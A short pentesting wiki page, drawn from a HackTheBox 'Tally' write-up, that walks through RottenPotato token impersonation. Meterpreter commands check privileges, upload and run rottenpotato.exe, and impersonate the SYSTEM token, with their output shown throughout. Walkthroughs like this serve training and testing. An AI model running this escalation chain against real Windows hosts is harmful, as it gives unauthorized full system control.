# RottenPotato

The info in this page info was extracted [from this post](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/)

Service accounts usually have special privileges \(SeImpersonatePrivileges\) and this could be used to escalate privileges.

[https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

I won’t go into the details on how this exploit works, the article above explains it far better than I ever could.

Let’s check our privileges with meterpreter:

```text
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

Excellent, it looks like we have the privileges we need to perform the attack. Let’s upload `rottenpotato.exe`

Back on our meterpreter session we load the `incognito` extension.

```text
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
TALLY\Sarah

Impersonation Tokens Available
========================================
No tokens available
```

We can see we currently have no Impersonation Tokens. Let’s run the Rotten Potato exploit.

```text
meterpreter > execute -f rottenpotato.exe -Hc
Process 3104 created.
Channel 2 created.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
TALLY\Sarah

Impersonation Tokens Available
========================================
NT AUTHORITY\SYSTEM
```

We need to quickly impersonate the token or it will disappear.

```text
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Success! We have our SYSTEM shell and can grab the root.txt file!

